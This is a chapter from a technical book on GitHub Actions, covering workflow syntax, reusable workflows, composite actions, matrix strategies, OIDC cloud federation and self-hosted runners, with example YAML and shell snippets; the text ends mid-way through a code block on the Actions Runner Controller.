<!--
  CHAPTER: 33
  TITLE: GitHub Actions Mastery
  PART: III — Tooling & Practice
  PREREQS: Ch 7 (DevOps), Ch 15 (Codebase Organization), Ch 8 (Testing)
  KEY_TOPICS: GitHub Actions workflow syntax, reusable workflows, composite actions, matrix strategies, OIDC federation, self-hosted runners, monorepo CI, custom actions, security hardening, performance optimization
  DIFFICULTY: Intermediate → Advanced
  UPDATED: 2026-03-24
-->

# Chapter 33: GitHub Actions Mastery

> **Part III — Tooling & Practice** | Prerequisites: Ch 7 (DevOps), Ch 15, Ch 8 | Difficulty: Intermediate to Advanced

From basic YAML to production-grade CI/CD — reusable workflows, OIDC federation, self-hosted runners, monorepo patterns, custom actions, security hardening, and performance optimization that separates copy-paste pipelines from engineered delivery systems.

### In This Chapter
- Why a Dedicated Chapter on GitHub Actions
- Workflow Syntax Deep Dive
- Reusable Workflows
- Composite Actions
- Matrix Strategies
- OIDC Federation (The Modern Way)
- Self-Hosted Runners
- Monorepo CI Patterns
- Building Custom Actions
- Security Hardening
- Performance Optimization
- Advanced Patterns
- Debugging and Troubleshooting
- The 100x CI/CD Pipeline

### Related Chapters
- Chapter 7 — DevOps fundamentals and CI/CD concepts
- Chapter 8 — Testing strategies that CI enforces
- Chapter 15 — Codebase organization, linting, basic CI/CD pipeline setup
- Chapter 5 — Security principles (applied here to supply chain)
- Chapter 19 — AWS infrastructure (OIDC federation target)
- Chapter 12 — Git workflows and tooling

---

## 1. WHY A DEDICATED CHAPTER ON GITHUB ACTIONS

Here is a story. A team of eight engineers spent 45 minutes every week babysitting deployments. Not because the software was broken — because the CI pipeline was. Tests ran in random order. Secrets were stored as plaintext environment variables. The deploy job would silently succeed even when Docker push failed. One engineer's entire Friday was consumed by a workflow that had been copy-pasted twelve times across twelve microservices, and now needed updating in all twelve places.

Another 15 minutes had been shaved off one team's PR cycle by doing nothing more than adding `cancel-in-progress: true` to their concurrency group. That is not a dramatic story. That is Tuesday.

The difference between those two teams is not talent. It is whether anyone had stopped to treat CI/CD as engineering.

Chapter 15 §2 covers CI/CD pipeline basics — lint, test, build, deploy stages. That is enough to get a pipeline running. It is not enough to run one well.

**The gap between "works" and "mastery" is enormous.** A basic pipeline takes 15 minutes. A well-engineered one takes 3 minutes, costs 60% less, is immune to supply chain attacks, requires zero secret rotation, and scales across 50 repositories without copy-pasting a single YAML file.

GitHub Actions is the dominant CI/CD platform. Over 85% of open-source projects use it. The majority of startups and a growing share of enterprises run on it. If you write backend code professionally, you will maintain GitHub Actions workflows. The question is whether you maintain them well.

**What this chapter covers that Ch 15 does not:**
- Reusable workflows and composite actions (DRY across repos)
- OIDC federation (zero long-lived secrets)
- Matrix strategies for exhaustive testing
- Self-hosted runners for cost and performance
- Security hardening against supply chain attacks
- Monorepo-specific CI patterns
- Building custom actions
- Performance optimization at scale

**The thesis:** CI/CD is infrastructure. Treat it with the same rigor you apply to your application code — version it, test it, review it, optimize it, secure it. As Ch 7 established, DevOps is not a role; it is a practice. Your GitHub Actions workflows are where that practice lives day-to-day.

---

## 2. WORKFLOW SYNTAX DEEP DIVE

Every workflow is a YAML file sitting in `.github/workflows/`. GitHub reads it, interprets the triggers, and spins up runners to execute the jobs. That part is simple. What separates a great pipeline from a mediocre one is deep fluency with the syntax — knowing not just how things work, but when to use each option and why.

### 2.1 Triggers (The `on:` Block)

Every workflow starts with a trigger. Most engineers know `push` and `pull_request`. There are many more — and the right trigger for the wrong situation is a common source of both wasted runner minutes and subtle security holes.

```yaml
on:
  # Code changes
  push:
    branches: [main, release/*]
    tags: ['v*']
    paths: ['src/**', 'package.json']
  pull_request:
    branches: [main]
    types: [opened, synchronize, reopened]  # Default types if omitted
    paths-ignore: ['docs/**', '*.md']

  # Manual triggers
  workflow_dispatch:
    inputs:
      environment:
        description: 'Target environment'
        required: true
        type: choice
        options: [staging, production]
      dry_run:
        description: 'Dry run (no actual deploy)'
        type: boolean
        default: false

  # Scheduled (cron syntax, UTC)
  schedule:
    - cron: '0 6 * * 1'    # Every Monday at 6 AM UTC
    - cron: '0 */4 * * *'  # Every 4 hours

  # Cross-repo triggers
  repository_dispatch:
    types: [deploy-backend, run-integration-tests]

  # Called by other workflows (reusable)
  workflow_call:
    inputs:
      node_version:
        type: string
        default: '22'
    secrets:
      NPM_TOKEN:
        required: true
```

**Key distinctions:**

| Trigger | Runs on | Use Case |
|---------|---------|----------|
| `push` | Commit SHA on target branch | Post-merge CI, deploys |
| `pull_request` | Merge commit (PR + base) | Pre-merge validation |
| `pull_request_target` | Base branch HEAD | Safe access to secrets for fork PRs |
| `workflow_dispatch` | Any ref (branch/tag) | Manual deploys, ad-hoc tasks |
| `schedule` | Default branch only | Dependency updates, cleanup |
| `repository_dispatch` | Default branch | Cross-repo orchestration |
| `workflow_call` | Caller's context | Reusable workflows |

**Critical detail:** `pull_request` events from forks do not have access to secrets. This is a security feature, not a bug. If you need secrets for fork PR validation (e.g., to post comments), use `pull_request_target` with extreme caution — it runs in the context of the base branch and has full secret access. Getting this wrong is how you hand a stranger the keys to your cloud account.

### 2.2 Event Filtering

Path filtering is the single most impactful optimization for monorepos — and it costs you nothing but a few lines of YAML.

```yaml
# Only run when these paths change (positive filter)
on:
  push:
    branches: [main]
    paths:
      - 'apps/api/**'
      - 'packages/shared/**'
      - 'package.json'
      - '.github/workflows/api-ci.yml'
```

```yaml
# Run on everything EXCEPT these paths (negative filter)
on:
  push:
    branches: [main]
    paths-ignore:
      - '**/*.md'
      - 'docs/**'
```

**Rules:**
- `paths` and `paths-ignore` **cannot** be combined in the same trigger — use one or the other.
- Patterns use `fnmatch` syntax. `**` matches any directory depth.
- If only `paths` is set, the workflow only runs when those paths change.
- Always include the workflow file itself in `paths` so changes to CI trigger CI.

Tag filtering for releases:

```yaml
on:
  push:
    tags:
      - 'v[0-9]+.[0-9]+.[0-9]+'      # v1.2.3
      - 'v[0-9]+.[0-9]+.[0-9]+-*'    # v1.2.3-beta.1
```

### 2.3 Context Objects

GitHub Actions exposes rich context objects that let your workflows make intelligent decisions based on who triggered them, what changed, and where they are running. Think of these as the sensor inputs for your automation assembly line.

```yaml
steps:
  - name: Context examples
    run: |
      echo "Event: ${{ github.event_name }}"           # push, pull_request, etc.
      echo "Ref: ${{ github.ref }}"                     # refs/heads/main, refs/tags/v1.0
      echo "SHA: ${{ github.sha }}"                     # Full commit SHA
      echo "Actor: ${{ github.actor }}"                 # Who triggered
      echo "Repo: ${{ github.repository }}"             # owner/repo
      echo "Run ID: ${{ github.run_id }}"               # Unique run identifier
      echo "Run number: ${{ github.run_number }}"       # Sequential per workflow
      echo "Server URL: ${{ github.server_url }}"       # https://github.com
      echo "API URL: ${{ github.api_url }}"             # https://api.github.com
      echo "Workspace: ${{ github.workspace }}"         # /home/runner/work/repo/repo
```

**Cross-step data passing:**

```yaml
steps:
  - name: Generate version
    id: version
    run: echo "tag=v$(date +%Y%m%d)-${{ github.run_number }}" >> "$GITHUB_OUTPUT"

  - name: Use version
    run: echo "Deploying ${{ steps.version.outputs.tag }}"
```

**Cross-job data passing (via outputs):**

```yaml
jobs:
  setup:
    runs-on: ubuntu-latest
    outputs:
      version: ${{ steps.version.outputs.tag }}
      should_deploy: ${{ steps.check.outputs.deploy }}
    steps:
      - id: version
        run: echo "tag=v1.2.3" >> "$GITHUB_OUTPUT"
      - id: check
        run: echo "deploy=true" >> "$GITHUB_OUTPUT"

  deploy:
    needs: setup
    if: needs.setup.outputs.should_deploy == 'true'
    runs-on: ubuntu-latest
    steps:
      - run: echo "Deploying ${{ needs.setup.outputs.version }}"
```

### 2.4 Expressions and Conditionals

The `${{ }}` expression syntax is where your pipelines get smart. This is the logic layer of your assembly line — routing work to the right station, skipping steps that do not apply, catching failures before they propagate.

```yaml
jobs:
  test:
    runs-on: ubuntu-latest
    steps:
      - name: Only on main
        if: github.ref == 'refs/heads/main'
        run: echo "On main branch"

      - name: Only on PRs to main
        if: github.event_name == 'pull_request' && github.base_ref == 'main'
        run: echo "PR targeting main"

      - name: Skip for bot commits
        if: "!contains(github.event.head_commit.message, '[skip ci]')"
        run: npm test

      - name: Run on failure of previous steps
        if: failure()
        run: echo "Something failed above"

      - name: Always run (even if cancelled)
        if: always()
        run: echo "Cleanup tasks"

      - name: Only if previous job succeeded
        if: success()
        run: echo "All good"
```

**Status check functions:**

| Function | When it runs |
|----------|-------------|
| `success()` | All previous steps succeeded (default if no `if:`) |
| `failure()` | Any previous step failed |
| `always()` | Always runs, even if workflow is cancelled |
| `cancelled()` | Workflow was cancelled |

**Type coercion gotcha:** Outputs are always strings. Comparing `steps.x.outputs.count > 0` compares strings lexicographically. Use `fromJSON()` to cast: `fromJSON(steps.x.outputs.count) > 0`. This one bites everyone at least once.

### 2.5 Permissions

Every workflow gets a `GITHUB_TOKEN` automatically. By default, it has broad permissions. The principle of least privilege from Ch 5 applies here just as much as it does to IAM roles — your CI token should only be able to do what it needs to do, and nothing more.

```yaml
# Top-level: restrict default permissions for all jobs
permissions:
  contents: read

jobs:
  test:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v4
      - run: npm test

  comment:
    runs-on: ubuntu-latest
    # Job-level: grant only what this job needs
    permissions:
      contents: read
      pull-requests: write
    steps:
      - name: Post PR comment
        uses: actions/github-script@v7
        with:
          script: |
            github.rest.issues.createComment({
              issue_number: context.issue.number,
              owner: context.repo.owner,
              repo: context.repo.repo,
              body: 'Tests passed!'
            })
```

**Common permission scopes:**

| Scope | Typical need |
|-------|-------------|
| `contents: read` | Checkout code |
| `contents: write` | Push commits, create releases |
| `pull-requests: write` | Post PR comments, update status |
| `issues: write` | Create/update issues |
| `packages: write` | Publish to GitHub Packages |
| `id-token: write` | OIDC federation (see §6) |
| `actions: read` | List workflow runs |
| `security-events: write` | Upload SARIF (code scanning) |

**Rule:** Set `permissions: {}` at the top level (no permissions) and grant per-job. This is the principle of least privilege applied to CI. One compromised job should not give an attacker the ability to push to main.

### 2.6 Real-World Example: Monorepo Path Filtering

Here is what a properly constructed backend CI workflow looks like — the kind that is still fast and precise three years after you wrote it.

```yaml
name: Backend CI

on:
  pull_request:
    paths:
      - 'apps/api/**'
      - 'packages/shared/**'
      - 'packages/database/**'
      - '.github/workflows/backend-ci.yml'

permissions:
  contents: read
  pull-requests: write

jobs:
  test:
    runs-on: ubuntu-latest
    services:
      postgres:
        image: postgres:16
        env:
          POSTGRES_USER: test
          POSTGRES_PASSWORD: test
          POSTGRES_DB: testdb
        ports:
          - 5432:5432
        options: >-
          --health-cmd pg_isready
          --health-interval 10s
          --health-timeout 5s
          --health-retries 5

    steps:
      - uses: actions/checkout@v4

      - uses: actions/setup-node@v4
        with:
          node-version: 22
          cache: 'npm'

      - run: npm ci

      - name: Run migrations
        run: npx prisma migrate deploy
        working-directory: apps/api
        env:
          DATABASE_URL: postgresql://test:test@localhost:5432/testdb

      - name: Run tests
        run: npm run test -- --filter=api
        env:
          DATABASE_URL: postgresql://test:test@localhost:5432/testdb
```

This workflow only triggers when backend-related files change. It spins up a real Postgres service container for integration tests. It caches npm dependencies. It runs in under 3 minutes for most changes. The frontend engineer who only touched a CSS file never waits for it.

---

## 3. REUSABLE WORKFLOWS

### 3.1 The Problem: The YAML Copy-Paste Trap

Picture this: you joined a company with 12 microservices. Each has its own `.github/workflows/ci.yml`. They all look identical — same Node setup, same lint step, same test runner, same deploy script. Because they were copy-pasted from one original workflow written in 2023.

Now the security team wants you to add Trivy container scanning to every pipeline. You spend two days opening 12 PRs, getting 12 rounds of review, merging 12 changes, and immediately forgetting about the two repos where the PR sat unreviewed for three weeks. Four months later, a vulnerability slips through one of those unscanned repos.

That is not a hypothetical. That is a pattern that plays out across companies of every size.

Reusable workflows are the solution. Write the pipeline once. Call it from everywhere. Update in one place.

### 3.2 Creating a Reusable Workflow

Reusable workflows live in a repository (often a dedicated `.github` repo) and are called via `workflow_call`:

```yaml
# .github/workflows/node-ci.yml in org/shared-workflows repo
name: Node.js CI (Reusable)

on:
  workflow_call:
    inputs:
      node_version:
        description: 'Node.js version'
        type: string
        default: '22'
      working_directory:
        description: 'Directory containing package.json'
        type: string
        default: '.'
      run_e2e:
        description: 'Run E2E tests'
        type: boolean
        default: false
      test_command:
        description: 'Test command to run'
        type: string
        default: 'npm test'
    secrets:
      NPM_TOKEN:
        required: false
      CODECOV_TOKEN:
        required: false
    outputs:
      coverage_percent:
        description: 'Test coverage percentage'
        value: ${{ jobs.test.outputs.coverage }}

jobs:
  lint:
    runs-on: ubuntu-latest
    defaults:
      run:
        working-directory: ${{ inputs.working_directory }}
    steps:
      - uses: actions/checkout@v4
      - uses: actions/setup-node@v4
        with:
          node-version: ${{ inputs.node_version }}
          cache: 'npm'
          cache-dependency-path: ${{ inputs.working_directory }}/package-lock.json
      - run: npm ci
      - run: npm run lint
      - run: npm run typecheck

  test:
    runs-on: ubuntu-latest
    outputs:
      coverage: ${{ steps.coverage.outputs.percent }}
    defaults:
      run:
        working-directory: ${{ inputs.working_directory }}
    steps:
      - uses: actions/checkout@v4
      - uses: actions/setup-node@v4
        with:
          node-version: ${{ inputs.node_version }}
          cache: 'npm'
          cache-dependency-path: ${{ inputs.working_directory }}/package-lock.json
      - run: npm ci
      - name: Run tests
        run: ${{ inputs.test_command }} -- --coverage
      - name: Extract coverage
        id: coverage
        run: |
          PERCENT=$(jq '.total.lines.pct' coverage/coverage-summary.json)
          echo "percent=$PERCENT" >> "$GITHUB_OUTPUT"
      - name: Upload coverage
        if: inputs.run_e2e == false
        uses: codecov/codecov-action@v4
        with:
          token: ${{ secrets.CODECOV_TOKEN }}

  e2e:
    if: inputs.run_e2e
    needs: [lint, test]
    runs-on: ubuntu-latest
    defaults:
      run:
        working-directory: ${{ inputs.working_directory }}
    steps:
      - uses: actions/checkout@v4
      - uses: actions/setup-node@v4
        with:
          node-version: ${{ inputs.node_version }}
          cache: 'npm'
      - run: npm ci
      - run: npx playwright install --with-deps
      - run: npm run test:e2e
```

### 3.3 Calling a Reusable Workflow

From any repo in your organization, calling this reusable workflow is 12 lines:

```yaml
# .github/workflows/ci.yml in org/user-service repo
name: CI

on:
  pull_request:
    branches: [main]

jobs:
  ci:
    uses: org/shared-workflows/.github/workflows/node-ci.yml@v1
    with:
      node_version: '22'
      working_directory: '.'
      run_e2e: true
      test_command: 'npm run test:unit'
    secrets:
      NPM_TOKEN: ${{ secrets.NPM_TOKEN }}
      CODECOV_TOKEN: ${{ secrets.CODECOV_TOKEN }}
```

Now when you need to add Trivy scanning to all 12 services, you edit one file. One PR. One review. Done.

**Key points:**
- Reference with `owner/repo/.github/workflows/file.yml@ref`
- `@ref` can be a branch, tag, or SHA. Use tags for stability (`@v1`), SHAs for security.
- `secrets: inherit` passes all secrets from the caller (convenient but less explicit).
- Reusable workflows can call other reusable workflows, up to 4 levels deep.

### 3.4 Reusable Workflows vs Composite Actions

Both solve code reuse. They solve different problems. Picking the wrong one is a common mistake.

| Aspect | Reusable Workflow | Composite Action |
|--------|------------------|-----------------|
| **Scope** | Entire workflow (multiple jobs) | Single set of steps within a job |
| **Trigger** | `workflow_call` | `uses:` in a step |
| **Can define jobs** | Yes | No (steps only) |
| **Can use services** | Yes | No |
| **Can use `secrets`** | Yes (explicit or inherit) | No (pass via inputs) |
| **Can define `strategy`** | Yes | No |
| **Caller visibility** | Shows as single job in UI | Steps visible inline |
| **Nesting limit** | 4 levels | Unlimited |
| **Best for** | Standardizing entire CI pipelines | Reusable setup/utility steps |

**Decision rule:** If you are standardizing what an entire pipeline looks like — the full sequence of lint, test, build, deploy — use a reusable workflow. If you are extracting common step sequences that appear inside jobs (checkout + setup + install), use a composite action. Think of reusable workflows as assembly line templates, and composite actions as reusable tool heads on each station.

---

## 4. COMPOSITE ACTIONS

### 4.1 Structure

A composite action lives in a directory with an `action.yml` file. It is the tool that every station on your assembly line can pick up and use.

```yaml
# .github/actions/setup-project/action.yml
name: 'Setup Project'
description: 'Checkout, setup Node, install dependencies with caching'

inputs:
  node_version:
    description: 'Node.js version'
    required: false
    default: '22'
  working_directory:
    description: 'Working directory'
    required: false
    default: '.'

outputs:
  cache_hit:
    description: 'Whether npm cache was hit'
    value: ${{ steps.cache.outputs.cache-hit }}

runs:
  using: 'composite'
  steps:
    - name: Checkout
      uses: actions/checkout@11bd71901bbe5b1630ceea73d27597364c9af683  # v4.2.2

    - name: Setup Node.js
      uses: actions/setup-node@39370e3970a6d050c480ffad4ff0ed4d3fdee5af  # v4.1.0
      with:
        node-version: ${{ inputs.node_version }}
        cache: 'npm'
        cache-dependency-path: ${{ inputs.working_directory }}/package-lock.json
      id: cache

    - name: Install dependencies
      shell: bash
      working-directory: ${{ inputs.working_directory }}
      run: npm ci

    - name: Verify installation
      shell: bash
      working-directory: ${{ inputs.working_directory }}
      run: |
        echo "Node $(node --version)"
        echo "npm $(npm --version)"
        echo "Dependencies installed: $(ls node_modules | wc -l) packages"
```

**Important:** Every `run:` step in a composite action **must** specify `shell:`. This is not optional — GitHub Actions cannot infer the shell when the action might be called from different operating systems.

### 4.2 Using Composite Actions

**From the same repo (monorepo pattern):**

```yaml
jobs:
  test:
    runs-on: ubuntu-latest
    steps:
      - uses: ./.github/actions/setup-project
        with:
          node_version: '22'
          working_directory: 'apps/api'

      - name: Run tests
        run: npm test
        working-directory: apps/api
```

**From another repo:**

```yaml
steps:
  - uses: org/shared-actions/setup-project@v1
    with:
      node_version: '22'
```

### 4.3 Monorepo Pattern: Local Composite Actions

In a monorepo (see Ch 15 §3 for the full codebase organization philosophy), composite actions become the DRY mechanism for step sequences that repeat across every package workflow. Put them in `.github/actions/`:

```
.github/
  actions/
    setup-project/
      action.yml
    setup-database/
      action.yml
    deploy-service/
      action.yml
  workflows/
    api-ci.yml
    web-ci.yml
    shared-tests.yml
```

**Database setup composite action:**

```yaml
# .github/actions/setup-database/action.yml
name: 'Setup Test Database'
description: 'Run migrations and seed test data'

inputs:
  database_url:
    description: 'PostgreSQL connection string'
    required: true
  working_directory:
    description: 'Directory with Prisma schema'
    required: false
    default: '.'

runs:
  using: 'composite'
  steps:
    - name: Wait for Postgres
      shell: bash
      run: |
        for i in {1..30}; do
          pg_isready -h localhost -p 5432 && break
          echo "Waiting for Postgres... ($i/30)"
          sleep 1
        done

    - name: Run migrations
      shell: bash
      working-directory: ${{ inputs.working_directory }}
      env:
        DATABASE_URL: ${{ inputs.database_url }}
      run: npx prisma migrate deploy

    - name: Seed test data
      shell: bash
      working-directory: ${{ inputs.working_directory }}
      env:
        DATABASE_URL: ${{ inputs.database_url }}
      run: npx prisma db seed
```

Every workflow in the monorepo that needs a test database calls this action. When the migration tooling changes, you update one file.

### 4.4 Publishing to the Marketplace

To publish a composite action:

1. The `action.yml` must be at the repo root (not in a subdirectory).
2. Add `branding:` to `action.yml`:

```yaml
branding:
  icon: 'package'
  color: 'blue'
```

3. Create a GitHub Release. The marketplace listing is auto-generated from the release and `action.yml`.

**Versioning convention:** Tag releases as `v1.0.0`. Maintain a floating major version tag (`v1`) that always points to the latest `v1.x.x`. Consumers reference `@v1` for automatic minor/patch updates.

```bash
git tag -a v1.2.0 -m "Release v1.2.0"
git push origin v1.2.0

# Update floating tag
git tag -fa v1 -m "Update v1 to v1.2.0"
git push origin v1 --force
```

---

## 5. MATRIX STRATEGIES

### 5.1 The Assembly Line Goes Wide

Matrix strategies are where GitHub Actions starts to feel genuinely powerful. Instead of running tests once, you fan out across every combination of OS, runtime version, and database version you care about — simultaneously. It is the CI equivalent of spinning up a hundred workers on an assembly line instead of one.

### 5.2 Basic Matrix

```yaml
jobs:
  test:
    runs-on: ${{ matrix.os }}
    strategy:
      matrix:
        os: [ubuntu-latest, macos-latest]
        node: [20, 22]
        # Creates 4 jobs: ubuntu/20, ubuntu/22, macos/20, macos/22
    steps:
      - uses: actions/checkout@v4
      - uses: actions/setup-node@v4
        with:
          node-version: ${{ matrix.node }}
      - run: npm ci
      - run: npm test
```

### 5.3 Include and Exclude

Fine-tune the matrix without testing every combination. Not every axis of variation is worth crossing with every other:

```yaml
strategy:
  matrix:
    node: [20, 22]
    postgres: [15, 16]
    include:
      # Add a specific combination with extra variables
      - node: 22
        postgres: 16
        coverage: true        # Only collect coverage on latest versions
      # Add an entirely new combination
      - node: 23
        postgres: 17
        experimental: true
    exclude:
      # Skip this specific combination
      - node: 20
        postgres: 16
```

### 5.4 Dynamic Matrix

Generate the matrix from a previous job. This is where things get genuinely elegant for monorepos — the pipeline figures out what to test based on what changed, rather than you hardcoding it.

```yaml
jobs:
  detect-changes:
    runs-on: ubuntu-latest
    outputs:
      packages: ${{ steps.changes.outputs.packages }}
    steps:
      - uses: actions/checkout@v4
      - id: changes
        run: |
          # Detect which packages changed
          PACKAGES=$(ls packages/ | jq -R -s -c 'split("\n") | map(select(. != ""))')
          echo "packages=$PACKAGES" >> "$GITHUB_OUTPUT"

  test:
    needs: detect-changes
    runs-on: ubuntu-latest
    strategy:
      matrix:
        package: ${{ fromJSON(needs.detect-changes.outputs.packages) }}
    steps:
      - uses: actions/checkout@v4
      - run: npm test --workspace=packages/${{ matrix.package }}
```

### 5.5 Fail-Fast and Parallelism

```yaml
strategy:
  fail-fast: false     # Don't cancel other jobs when one fails
  max-parallel: 4      # Limit concurrent jobs (useful for rate-limited APIs)
  matrix:
    shard: [1, 2, 3, 4, 5]
```

**Default behavior:** `fail-fast: true` — if any matrix job fails, all other running matrix jobs are cancelled. Set `false` when you want to see all failures (e.g., to know which Node version breaks, not just that one does). Fail-fast is useful when you only care whether something passes. Fail-slow is useful when you are diagnosing compatibility.

### 5.6 Test Sharding

Split a large test suite across matrix runners for parallelism. This is one of the highest-ROI techniques in this entire chapter.

```yaml
jobs:
  test:
    runs-on: ubuntu-latest
    strategy:
      fail-fast: false
      matrix:
        shard: [1, 2, 3, 4]
        total_shards: [4]
    steps:
      - uses: actions/checkout@v4
      - uses: actions/setup-node@v4
        with:
          node-version: 22
          cache: 'npm'
      - run: npm ci

      # Jest sharding
      - name: Run tests (shard ${{ matrix.shard }}/${{ matrix.total_shards[0] }})
        run: npx jest --shard=${{ matrix.shard }}/${{ matrix.total_shards[0] }}

      # OR Vitest sharding
      # - run: npx vitest --shard=${{ matrix.shard }}/${{ matrix.total_shards[0] }}

      # OR Playwright sharding
      # - run: npx playwright test --shard=${{ matrix.shard }}/${{ matrix.total_shards[0] }}
```

**Performance impact:** A 12-minute test suite split across 4 shards runs in ~3 minutes. The overhead of 4 parallel runners is about 30 seconds of setup each. Net win: 9 minutes per PR. If your team opens 20 PRs per day, that is 3 hours of engineer waiting time you have just eliminated — every single day.

### 5.7 Real-World Matrix: Multi-DB, Multi-Runtime

Here is the kind of matrix that gives you real confidence in cross-version compatibility:

```yaml
jobs:
  test:
    runs-on: ubuntu-latest
    strategy:
      fail-fast: false
      matrix:
        node: [20, 22]
        postgres: [15, 16]
        include:
          - node: 22
            postgres: 16
            upload_coverage: true
    services:
      postgres:
        image: postgres:${{ matrix.postgres }}
        env:
          POSTGRES_USER: test
          POSTGRES_PASSWORD: test
          POSTGRES_DB: testdb
        ports:
          - 5432:5432
        options: >-
          --health-cmd pg_isready
          --health-interval 10s
          --health-timeout 5s
          --health-retries 5
    steps:
      - uses: actions/checkout@v4
      - uses: actions/setup-node@v4
        with:
          node-version: ${{ matrix.node }}
          cache: 'npm'
      - run: npm ci
      - run: npm test
        env:
          DATABASE_URL: postgresql://test:test@localhost:5432/testdb
      - name: Upload coverage
        if: matrix.upload_coverage
        uses: codecov/codecov-action@v4
```

---

## 6. OIDC FEDERATION (THE MODERN WAY)

### 6.1 The Credential Graveyard

Every company has a `SECRETS_THAT_DEFINITELY_ROTATE` Notion doc that has not been updated since 2022. You know the one. Inside: AWS access keys for production, added by an engineer who left the company. Rotation policy: "TODO." Permissions: `AdministratorAccess`, because making narrow IAM policies was annoying and there was a deadline.

This is how breaches happen. Not dramatically. Just gradually, through accumulated laziness and the friction of doing the secure thing.

OIDC federation eliminates this entire class of problem. GitHub issues a short-lived JWT when your workflow runs. Your cloud provider validates it and issues temporary credentials. No secrets stored in GitHub. No rotation needed. Audit trail built in. When the job finishes, the credentials expire. An attacker who somehow steals the token gets credentials that stopped working 15 minutes ago.

### 6.2 How It Works

```
GitHub Actions Runner                     AWS / GCP / Azure
        │                                        │
        ├── 1. Request OIDC token ──────────────>│
        │   (JWT signed by GitHub)               │
        │                                        │
        │<── 2. Validate JWT ────────────────────┤
        │   (check issuer, audience, claims)     │
        │                                        │
        │<── 3. Issue temporary credentials ─────┤
        │   (15-60 min TTL, scoped role)         │
        │                                        │
        ├── 4. Use temporary creds ──────────────>
        │   (deploy, push to ECR, etc.)          │
```

The JWT contains claims about the workflow: repository, branch, environment, actor, job ID. Your cloud provider's trust policy can restrict access based on any of these. A role that only works when called from `repo:my-org/my-repo:environment:production` cannot be triggered by a PR from a fork, a branch deploy, or anything else.

### 6.3 AWS OIDC Setup

**Step 1: Create the OIDC Identity Provider in AWS (one-time setup):**

```bash
aws iam create-open-id-connect-provider \
  --url "https://token.actions.githubusercontent.com" \
  --client-id-list "sts.amazonaws.com" \
  --thumbprint-list "6938fd4d98bab03faadb97b34396831e3780aea1"
```

**Step 2: Create IAM Role with trust policy:**

```json
{
  "Version": "2012-10-17",
  "Statement": [
    {
      "Effect": "Allow",
      "Principal": {
        "Federated": "arn:aws:iam::ACCOUNT_ID:oidc-provider/token.actions.githubusercontent.com"
      },
      "Action": "sts:AssumeRoleWithWebIdentity",
      "Condition": {
        "StringEquals": {
          "token.actions.githubusercontent.com:aud": "sts.amazonaws.com"
        },
        "StringLike": {
          "token.actions.githubusercontent.com:sub": "repo:my-org/my-repo:*"
        }
      }
    }
  ]
}
```

**Step 3: Lock down by branch and environment:**

```json
{
  "Condition": {
    "StringEquals": {
      "token.actions.githubusercontent.com:aud": "sts.amazonaws.com",
      "token.actions.githubusercontent.com:sub": "repo:my-org/my-repo:environment:production"
    }
  }
}
```

The `sub` claim format is `repo:OWNER/REPO:CONTEXT`. Context can be:
- `ref:refs/heads/main` — only main branch
- `environment:production` — only the production environment
- `pull_request` — any PR (avoid for production roles)
- `*` — any context (least restrictive)

**Step 4: Workflow configuration:**

```yaml
jobs:
  deploy:
    runs-on: ubuntu-latest
    permissions:
      id-token: write    # Required for OIDC
      contents: read
    environment: production
    steps:
      - uses: actions/checkout@v4

      - name: Configure AWS credentials via OIDC
        uses: aws-actions/configure-aws-credentials@v4
        with:
          role-to-assume: arn:aws:iam::123456789012:role/github-actions-deploy
          aws-region: us-east-1
          role-session-name: gha-deploy-${{ github.run_id }}

      - name: Deploy
        run: |
          aws ecs update-service --cluster prod --service api --force-new-deployment
```

No `AWS_ACCESS_KEY_ID` or `AWS_SECRET_ACCESS_KEY` anywhere. No secrets page entry to forget about. The credentials appear, do their job, and vanish.

### 6.4 GCP Workload Identity Federation

```yaml
jobs:
  deploy:
    runs-on: ubuntu-latest
    permissions:
      id-token: write
      contents: read
    steps:
      - uses: actions/checkout@v4

      - id: auth
        uses: google-github-actions/auth@v2
        with:
          workload_identity_provider: 'projects/PROJECT_NUMBER/locations/global/workloadIdentityPools/github/providers/my-repo'
          service_account: 'deploy@my-project.iam.gserviceaccount.com'

      - uses: google-github-actions/setup-gcloud@v2

      - run: gcloud run deploy api --source . --region us-central1
```

### 6.5 Azure Federated Credentials

```yaml
jobs:
  deploy:
    runs-on: ubuntu-latest
    permissions:
      id-token: write
      contents: read
    steps:
      - uses: actions/checkout@v4

      - uses: azure/login@v2
        with:
          client-id: ${{ secrets.AZURE_CLIENT_ID }}
          tenant-id: ${{ secrets.AZURE_TENANT_ID }}
          subscription-id: ${{ secrets.AZURE_SUBSCRIPTION_ID }}
          # No client-secret needed — OIDC handles it

      - run: az webapp deploy --name my-app --src-path ./dist
```

### 6.6 Credential Strategy Comparison

| Strategy | Rotation | Scope | Audit | Setup Effort | Best For |
|----------|----------|-------|-------|-------------|----------|
| Encrypted secrets | Manual (never in practice) | Broad | Minimal | Low | Quick prototypes |
| OIDC federation | Automatic (per-job) | Fine-grained | Full | Medium | Production workloads |
| HashiCorp Vault | Automatic (configurable TTL) | Fine-grained | Full | High | Multi-cloud, compliance |
| AWS Secrets Manager | Configurable | Per-secret | Full | Medium | App-level secrets |

**Recommendation:** Use OIDC for all cloud provider authentication in CI/CD. There is no good reason to store cloud credentials as GitHub secrets in 2026. If you are still doing it, stop reading, go set up OIDC, then come back.

---

## 7. SELF-HOSTED RUNNERS

### 7.1 When to Use Self-Hosted Runners

GitHub-hosted runners are excellent for most workloads — they are maintained, ephemeral, and require zero infrastructure overhead. Use self-hosted when:

- **Private network access:** You need to reach databases/services behind a VPN or private subnet.
- **GPU workloads:** ML model training, CUDA builds.
- **Custom hardware:** ARM builds, specific OS versions, hardware security modules.
- **Cost at scale:** At ~50+ concurrent runners, self-hosted becomes cheaper.
- **Build speed:** Persistent caches, pre-installed dependencies, larger machines.

If none of these apply to you, stick with GitHub-hosted. Self-hosted runners are infrastructure you now own and must maintain.

### 7.2 Ephemeral Runners

Always use ephemeral runners. A non-ephemeral runner retains state between jobs — cached credentials, modified filesystems, compromised dependencies from previous runs. One malicious job can poison every subsequent job that runs on the same machine.

```bash
# Register an ephemeral runner (one job, then exit)
./config.sh --url https://github.com/org/repo \
  --token TOKEN \
  --ephemeral \
  --labels self-hosted,linux,x64,gpu \
  --name "runner-$(hostname)-$$"
```

The runner executes one job and exits. Your orchestration layer (Kubernetes, ASG, etc.) creates a new one. Clean machine every time.

### 7.3 Actions Runner Controller (ARC) on Kubernetes

ARC is the standard way to run auto-scaling ephemeral runners on Kubernetes. It watches the GitHub Actions queue and spins up runners on demand, then terminates them after each job.

```yaml
# helm values for actions-runner-controller
